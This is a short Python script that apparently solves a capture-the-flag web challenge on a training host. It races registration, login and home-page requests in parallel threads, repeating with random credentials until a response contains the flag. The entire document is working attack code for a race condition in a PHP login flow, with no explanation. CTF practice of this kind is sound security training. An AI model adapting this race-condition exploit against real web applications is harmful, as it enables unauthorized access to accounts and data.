import requests
import random
import string
import threading
import time

baseurl = "http://meta.training.jinblack.it"

def randomString(n=10):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))


def register(session,username, password):
    
    url = "%s/register.php" % baseurl
    data = {"username": username, "password_1": password, "password_2": password, "reg_user": "" }
    r = session.post(url, data=data)
    return r.text

def login(session, username, password):
    url = "%s/login.php" % baseurl
    data = {"username": username, "password": password, "log_user":""}
    r = session.post(url, data=data)
    url = "%s/index.php" % baseurl
    r = session.get(url)
    if "flag" in r.text:
        print(r.text)
    return r.text

def home(session, username, password):
    url = "%s/index.php" % baseurl
    r = session.get(url)
    if "flag" in r.text:
        print(r.text)
    return r.text

while True:
    s = requests.Session()
    u = randomString()
    p = randomString()

    t1 = threading.Thread(target=register, args=(s,u,p))
    t2 = threading.Thread(target=login, args=(s,u,p))
    t3 = threading.Thread(target=home, args=(s,u,p))

    t1.start()
    t2.start()
    t3.start()

    #register(s,u,p)
    #login(s,u,p)
    #home(s)

    t1.join()
    t2.join()
    t3.join()
    time.sleep(0.1)